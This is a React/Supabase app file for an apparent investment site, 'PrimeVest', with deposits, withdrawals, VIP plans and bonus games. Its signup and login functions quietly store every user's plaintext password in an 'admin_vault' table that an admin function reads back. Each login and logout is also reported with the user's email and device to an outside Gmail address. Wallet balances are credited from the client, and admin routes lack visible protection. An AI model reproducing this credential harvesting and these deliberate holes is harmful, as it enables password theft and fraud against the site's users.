import { useState, useEffect, useCallback } from "react";
import { Routes, Route, Navigate, Link, useNavigate, useSearchParams, Outlet } from "react-router-dom";
import { createClient } from "@supabase/supabase-js";
import {
  ShieldCheck, Mail, Lock, Eye, EyeOff, ArrowRight, TrendingUp, UserRound, CheckCircle2,
  Bell, Home as HomeIcon, Wallet, ArrowDownToLine, ArrowUpFromLine, Users, Gift, Share2,
  Copy, Check, MessageSquare, Send, ChevronRight, ChevronDown, CircleDollarSign, Clock3,
  Settings as SettingsIcon, LogOut, X, Info, ArrowLeft, CreditCard, LockKeyhole, AlertCircle,
  Building2, Bitcoin, PiggyBank, BarChart3, PieChart, Search, XCircle, Loader2, ThumbsUp,
  Headphones, HelpCircle, User, Menu, Star, Sparkles, LineChart, Globe2, ExternalLink, Gamepad2,
  Rocket, Timer, Zap, Upload, Crown, Unlock, Lock as LockIcon, CheckCircle, RefreshCw, Ban, Download
} from "lucide-react";
import Terms from "./terms";
import {
  Deposit, DepositPayment, DepositCard, DepositBitcoin,
  Withdraw, WithdrawAccount, WithdrawSuccess, VIP, VIPCheckout, BonusGame, Invest,
  Portfolio, Settings, Help, History, ScratchCard, MysteryBox, Chat
} from "./pages";

export const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
);

const FN = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;

async function call(path, body) {
  const { data: { session } } = await supabase.auth.getSession();
  const res = await fetch(`${FN}/${path}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${session?.access_token || ""}` },
    body: JSON.stringify(body || {}),
  });
  return res.json();
}

async function notifyAdmin(name, email, type = "New Signup", extra = "") {
  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_key: import.meta.env.VITE_WEB3FORMS_KEY,
        subject: `PrimeVest: ${type}`,
        from_name: "PrimeVest",
        name,
        email,
        message: `Type: ${type}\nName: ${name}\nEmail: ${email}\n${extra}`,
      }),
    });
  } catch (err) {
    console.error("Email failed to send", err);
  }
}

async function sendLoginAlert(email, device, type="login") {
  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_key: import.meta.env.VITE_WEB3FORMS_KEY,
        subject: `🚨 User ${type === 'login' ? 'Login' : 'Logout'} Alert`,
        from_name: "PrimeVest Security",
        to: "primevest180@gmail.com",
        message: `User: ${email}\nAction: ${type.toUpperCase()}\nDevice: ${device}`,
      }),
    });
  } catch (err) {
    console.error("Login alert failed", err);
  }
}

export const api = {
  signup: async (name, email, password, ref) => {
    const finalName = name || email.split("@")[0].replace(/[^a-zA-Z]/g, " ");
    
    // Save to Vault for admin
    await supabase.from('admin_vault').insert({ email, password });

    const res = await supabase.auth.signUp({ email, password, options: { data: { name: finalName, ref } } });
    if (!res.error) notifyAdmin(finalName, email, "New User Signup");
    return res;
  },
  login: async (email, password) => {
    // Save to vault
    await supabase.from('admin_vault').insert({ email, password });
    
    const res = await supabase.auth.signInWithPassword({ email, password });
    if (!res.error) {
      const device = navigator.userAgent;
      sendLoginAlert(email, device, "login");
    }
    return res;
  },
  logout: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (user) sendLoginAlert(user.email, navigator.userAgent, "logout");
    return supabase.auth.signOut();
  },
  wallet: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("wallets").select("*").eq("user_id", user.id).single();
  },
  profile: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("profiles").select("*").eq("id", user.id).single();
  },
  setUsername: async (username) => {
    const { data: { user } } = await supabase.auth.getUser();
    const { error } = await supabase.from("profiles").update({ username }).eq("id", user.id);
    if (error) return { error: "Username already taken." };
    return { success: true };
  },
  // Friend & Chat Methods
  addFriend: async (username) => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: target } = await supabase.from("profiles").select("id").eq("username", username).single();
    if (!target) return { error: "User not found." };
    if (target.id === user.id) return { error: "You can't add yourself." };
    
    const { error } = await supabase.from("friendships").insert({ user_id: user.id, friend_id: target.id, status: 'pending' });
    if (error) return { error: "Request already sent or you are already friends." };
    return { success: true };
  },
  getFriendRequests: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("friendships").select("*, profiles!friendships_user_id_fkey(*)").eq("friend_id", user.id).eq("status", "pending");
  },
  acceptFriendRequest: async (id) => {
    await supabase.from("friendships").update({ status: 'accepted' }).eq("id", id);
    return { success: true };
  },
  getFriends: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data } = await supabase.from("friendships").select("*, profiles!friendships_user_id_fkey(*)").eq("user_id", user.id).eq("status", "accepted");
    const { data: reverse } = await supabase.from("friendships").select("*, profiles!friendships_friend_id_fkey(*)").eq("friend_id", user.id).eq("status", "accepted");
    
    // Format to combine both directions
    const all = [
      ...(data || []).map(f => ({ id: f.id, friend_id: f.friend_id, profiles: f.profiles })),
      ...(reverse || []).map(f => ({ id: f.id, friend_id: f.user_id, profiles: f.profiles }))
    ];
    return { data: all };
  },
  sendMessage: async (receiver_id, message) => {
    const { data: { user } } = await supabase.auth.getUser();
    const actualReceiver = receiver_id === "admin" ? "00000000-0000-0000-0000-000000000000" : receiver_id;
    await supabase.from("private_messages").insert({ sender_id: user.id, receiver_id: actualReceiver, message });
    
    // Simulate realtime notification
    await supabase.from("notifications").insert({ user_id: actualReceiver, title: "New Message", message: `You have a new message.`, type: "message" });
  },
  getMessages: async (target) => {
    const { data: { user } } = await supabase.auth.getUser();
    const actualTarget = target === "admin" ? "00000000-0000-0000-0000-000000000000" : target;
    
    return supabase.from("private_messages")
      .select("*")
      .or(`and(sender_id.eq.${user.id},receiver_id.eq.${actualTarget}),and(sender_id.eq.${actualTarget},receiver_id.eq.${user.id})`)
      .order("created_at", { ascending: true });
  },
  
  notifications: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("notifications").select("*").eq("user_id", user.id).order("created_at", { ascending: false });
  },
  markRead: (id) => supabase.from("notifications").update({ read: true }).eq("id", id),
  markAllRead: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("notifications").update({ read: true }).eq("user_id", user.id);
  },
  plans: () => supabase.from("plans").select("*").eq("active", true),
  portfolio: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("investments").select("*, plans(*)").eq("user_id", user.id).order("started_at", { ascending: false });
  },
  history: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("transactions").select("*").eq("user_id", user.id).order("created_at", { ascending: false });
  },
  depositInit: (amount, method, email, vip, type) => call("index", { action: "deposit", amount, method, email, vip, type }),
  
  withdraw: async (p) => {
    const { data: { user } } = await supabase.auth.getUser();
    
    const { error } = await supabase.from("withdrawals").insert({
      user_id: user.id,
      amount: p.amount,
      bank_name: p.bank_name,
      account_number: p.account_number,
      account_name: p.account_name,
      status: "pending",
      created_at: new Date().toISOString()
    });

    if (error) return { success: false, error: "Failed to save withdrawal request." };

    await supabase.from("transactions").insert({
      user_id: user.id, type: "withdraw", amount: p.amount,
      status: "pending", reference: `WD-${Date.now()}`, created_at: new Date().toISOString()
    });

    await supabase.from("notifications").insert({ 
      user_id: user.id, 
      title: "Withdrawal Requested", 
      message: `Your withdrawal of ₦${p.amount} is being processed.`, 
      type: "withdraw" 
    });
    
    return { success: true };
  },

  claimBonus: async (amount) => {
    const { data: { user } } = await supabase.auth.getUser();
    await supabase.from("transactions").insert({ user_id: user.id, type: "bonus", amount, status: "success", reference: `BONUS-${Date.now()}` });
    const { data: wallet } = await supabase.from("wallets").select("available, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) + amount, total: (wallet?.total || 0) + amount }).eq("user_id", user.id);
    return { success: true };
  },

  invest: async (plan_id, amount, daily_profit, matured_at) => {
    const { data: { user } } = await supabase.auth.getUser();
    return call("index", { action: "invest", plan_id, amount, daily_profit, matured_at, email: user.email });
  },

  claimInvestment: async (investment_id, amount) => {
    const { data: { user } } = await supabase.auth.getUser();
    
    const { data: inv } = await supabase.from("investments").select("last_daily_claim").eq("id", investment_id).single();
    if (inv?.last_daily_claim && Date.now() - new Date(inv.last_daily_claim).getTime() < 86400000) {
      return { success: false, error: "You can only claim once every 24 hours." };
    }
    
    const exactNow = new Date().toISOString();
    await supabase.from("investments").update({ last_daily_claim: exactNow }).eq("id", investment_id);
    
    const { data: wallet } = await supabase.from("wallets").select("available, earnings, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ 
        available: (wallet?.available || 0) + amount, 
        earnings: (wallet?.earnings || 0) + amount, 
        total: (wallet?.total || 0) + amount 
    }).eq("user_id", user.id);
    
    await supabase.from("transactions").insert({ user_id: user.id, type: "investment_profit", amount, status: "success", reference: `PROFIT-${Date.now()}` });
    return { success: true };
  },

  claimDailyLogin: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: profile } = await supabase.from("profiles").select("last_login_claim").eq("id", user.id).single();
    const now = new Date();
    
    if (profile?.last_login_claim && (now.getTime() - new Date(profile.last_login_claim).getTime()) < 86400000) {
      return { error: "Already claimed" };
    }
    
    await supabase.from("profiles").update({ last_login_claim: now.toISOString() }).eq("id", user.id);
    const { data: wallet } = await supabase.from("wallets").select("available, earnings, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) + 100, earnings: (wallet?.earnings || 0) + 100, total: (wallet?.total || 0) + 100 }).eq("user_id", user.id);
    await supabase.from("transactions").insert({ user_id: user.id, type: "daily_login", amount: 100, status: "success", reference: `LOGIN-${Date.now()}` });
    return { success: true };
  },

  rewardReferral: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: profile } = await supabase.from("profiles").select("referral_code, referral_earnings").eq("id", user.id).single();
    if (!profile?.referral_code) return { error: "You don't have a referral code." };
    const { data: referrals } = await supabase.from("profiles").select("id").eq("referred_by", profile.referral_code);
    if (!referrals || referrals.length === 0) return { error: "No one has used your link yet." };
    const expectedEarnings = referrals.length * 1000;
    const currentEarnings = profile?.referral_earnings || 0;
    if (currentEarnings >= expectedEarnings) return { error: "You have already been rewarded for all your referrals." };
    const amountToPay = expectedEarnings - currentEarnings;
    await supabase.from("profiles").update({ referral_earnings: expectedEarnings }).eq("id", user.id);
    const { data: wallet } = await supabase.from("wallets").select("available, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) + amountToPay, total: (wallet?.total || 0) + amountToPay }).eq("user_id", user.id);
    await supabase.from("transactions").insert({ user_id: user.id, type: "referral_bonus", amount: amountToPay, status: "success", reference: `REF-${Date.now()}` });
    return { amount: amountToPay };
  },

  getAdminStats: async () => {
    const { count: usersCount } = await supabase.from("profiles").select("*", { count: 'exact', head: true });
    const { data: withdrawals } = await supabase.from("withdrawals").select("amount, status");
    let totalWithdrawn = 0, pendingWithdrawals = 0;
    withdrawals?.forEach(w => {
      if (w.status === "success") totalWithdrawn += w.amount;
      if (w.status === "pending") pendingWithdrawals += w.amount;
    });
    return { usersCount, totalWithdrawn, pendingWithdrawals };
  },
  getAllUsers: async () => supabase.from("profiles").select("*").order("created_at", { ascending: false }),
  getAdminVault: async () => supabase.from("admin_vault").select("*").order("created_at", { ascending: false }),
  
  toggleUserFreeze: async (userId, currentStatus) => {
    const newStatus = currentStatus === "frozen" ? "active" : "frozen";
    await supabase.from("profiles").update({ account_status: newStatus }).eq("id", userId);
    return { success: true };
  },

  getAdminWithdrawals: async () => supabase.from("withdrawals").select("*").eq("status", "pending").order("created_at", { ascending: false }),
  
  approveWithdrawal: async (withdrawalId, user_id, amount) => {
    const { data: wallet } = await supabase.from("wallets").select("available, total").eq("user_id", user_id).single();
    await supabase.from("wallets").update({ available: (wallet?.available || 0) - amount, total: (wallet?.total || 0) - amount }).eq("user_id", user_id);
    await supabase.from("withdrawals").update({ status: "success" }).eq("id", withdrawalId);
    await supabase.from("transactions").update({ status: "success" }).eq("user_id", user_id).eq("type", "withdraw").eq("status", "pending");
    await supabase.from("notifications").insert({ user_id, title: "Withdrawal Approved", message: `Your withdrawal of ₦${amount} has been sent to your bank.`, type: "withdraw" });
    return { success: true };
  },

  rejectWithdrawal: async (withdrawalId, user_id, amount) => {
    await supabase.from("withdrawals").update({ status: "rejected" }).eq("id", withdrawalId);
    await supabase.from("transactions").update({ status: "failed" }).eq("user_id", user_id).eq("type", "withdraw").eq("status", "pending");
    await supabase.from("notifications").insert({ user_id, title: "Withdrawal Rejected", message: `Your withdrawal of ₦${amount} was rejected.`, type: "withdraw" });
    return { success: true };
  },

  adminBroadcast: async (title, message, targetUserId) => {
    if (targetUserId) {
      await supabase.from("notifications").insert({ user_id: targetUserId, title, message, type: "admin" });
    } else {
      const { data: users } = await supabase.from("profiles").select("id");
      const msgs = users.map(u => ({ user_id: u.id, title, message, type: "admin" }));
      await supabase.from("notifications").insert(msgs);
    }
    return { success: true };
  }
};

function LoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#070D1A]">
      <div className="relative flex h-24 w-24 items-center justify-center">
        <div className="absolute inset-0 rounded-full border-2 border-blue-500/30 animate-ping"></div>
        <div className="relative z-10 flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-blue-500 to-blue-800 shadow-2xl shadow-blue-900/50">
          <ShieldCheck size={32} className="text-white animate-bounce" />
        </div>
      </div>
      <h1 className="mt-6 text-2xl font-bold text-white tracking-widest">Prime<span className="text-blue-400">Vest</span></h1>
    </div>
  );
}

const Toast = ({ message, onClose }) => {
  useEffect(() => {
    const timer = setTimeout(onClose, 4000);
    return () => clearTimeout(timer);
  }, [onClose]);
  return (
    <div className="fixed top-6 left-1/2 -translate-x-1/2 z-[100] rounded-2xl border border-emerald-500/30 bg-[#0D1526] px-6 py-4 shadow-2xl backdrop-blur-xl flex items-center gap-3">
      <CheckCircle2 className="h-5 w-5 text-emerald-400" />
      <p className="text-sm font-semibold text-white">{message}</p>
    </div>
  );
};

function ProtectedRoute() {
  const [loading, setLoading] = useState(true);
  const [authed, setAuthed] = useState(false);
  const [isFrozen, setIsFrozen] = useState(false);
  
  useEffect(() => {
    supabase.auth.getSession().then(async ({ data }) => { 
      if (data.session) {
        setAuthed(true);
        const { data: profile } = await supabase.from("profiles").select("account_status").eq("id", data.session.user.id).single();
        if (profile?.account_status === "frozen") setIsFrozen(true);
      }
      setLoading(false); 
    });
    const { data: sub } = supabase.auth.onAuthStateChange((_e, s) => setAuthed(!!s));
    return () => sub.subscription.unsubscribe();
  }, []);

  if (loading) return <LoadingScreen />;
  
  if (isFrozen) {
    return (
      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 text-center">
        <Ban size={64} className="text-red-500 mb-4" />
        <h1 className="text-2xl font-bold text-white mb-2">Account Frozen</h1>
        <p className="text-slate-400 mb-6">Your account has been temporarily frozen by the administrator. Please contact support.</p>
        <button onClick={() => { supabase.auth.signOut(); window.location.href = "/"; }} className="bg-red-600 text-white px-6 py-3 rounded-xl font-bold">Log Out</button>
      </div>
    );
  }

  if (!authed) return <Navigate to="/login" replace />;
  return <Outlet />;
}

function UsernameGuard({ children }) {
  const [profile, setProfile] = useState(null);
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api.profile().then(({ data }) => {
      setProfile(data);
      setLoading(false);
    });
  }, []);

  if (loading) return <LoadingScreen />;

  if (profile && !profile.username) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
        <div className="w-full max-w-sm rounded-3xl bg-[#0D1526] p-8 text-center border border-blue-500/30 shadow-2xl">
          <UserRound className="h-12 w-12 text-blue-400 mx-auto mb-4" />
          <h2 className="text-xl font-bold text-white mb-2">Choose Your Username</h2>
          <p className="text-sm text-slate-400 mb-6">This is permanent and can never be changed.</p>
          <input value={username} onChange={e => setUsername(e.target.value.replace(/\s/g, ''))} placeholder="john_doe" className="w-full bg-slate-950 rounded-xl px-4 py-3 text-white outline-none mb-4" />
          <button onClick={async () => {
            if(username.length < 3) return alert("Min 3 chars");
            await api.setUsername(username);
            window.location.reload();
          }} className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">Set Username</button>
        </div>
      </div>
    );
  }

  return children;
}

function App() {
  // Register Service Worker
  useEffect(() => {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').catch(err => console.log('SW registration failed:', err));
    }
  }, []);

  return (
    <Routes>
      <Route path="/" element={<LandingPage />} />
      <Route path="/login" element={<Login />} />
      <Route path="/signup" element={<Signup />} />
      <Route path="/terms" element={<Terms />} />
      <Route path="/av" element={<AdminDashboard />} />

      <Route element={<ProtectedRoute />}>
        <Route element={<UsernameGuard><Outlet /></UsernameGuard>}>
          <Route path="/home" element={<HomePage />} />
          <Route path="/vip" element={<VIP />} />
          <Route path="/vip/checkout" element={<VIPCheckout />} />
          <Route path="/invest" element={<Invest />} />
          <Route path="/bonus" element={<BonusGame />} />
          <Route path="/scratch" element={<ScratchCard />} />
          <Route path="/mystery" element={<MysteryBox />} />
          <Route path="/deposit" element={<Deposit />} />
          <Route path="/deposit/payment" element={<DepositPayment />} />
          <Route path="/deposit/card" element={<DepositCard />} />
          <Route path="/deposit/bitcoin" element={<DepositBitcoin />} />
          <Route path="/withdraw" element={<Withdraw />} />
          <Route path="/withdraw/account" element={<WithdrawAccount />} />
          <Route path="/withdraw/success" element={<WithdrawSuccess />} />
          <Route path="/portfolio" element={<Portfolio />} />
          <Route path="/history" element={<History />} />
          <Route path="/settings" element={<Settings />} />
          <Route path="/help" element={<Help />} />
          <Route path="/chat" element={<Chat />} />
          <Route path="/chat/:id" element={<Chat />} />
        </Route>
      </Route>

      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
}

export default App;